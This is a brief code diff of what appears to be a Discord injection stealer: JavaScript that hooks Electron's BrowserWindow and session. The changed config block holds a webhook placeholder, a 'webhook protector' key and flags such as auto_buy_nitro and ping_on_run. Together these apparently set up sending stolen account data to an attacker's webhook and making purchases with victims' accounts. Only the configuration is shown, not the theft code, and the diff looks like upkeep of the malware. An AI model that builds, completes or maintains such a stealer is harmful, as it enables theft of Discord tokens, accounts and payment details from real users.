@@ -9,7 +9,7 @@ const { BrowserWindow, session } = require('electron');
 const Buffer = require('buffer').Buffer
 
 const config = {
-  webhook: '%WEBHOOK_HERE',
+  webhook: '%WEBHOOK%',
   webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: true, 
   ping_on_run: true, 
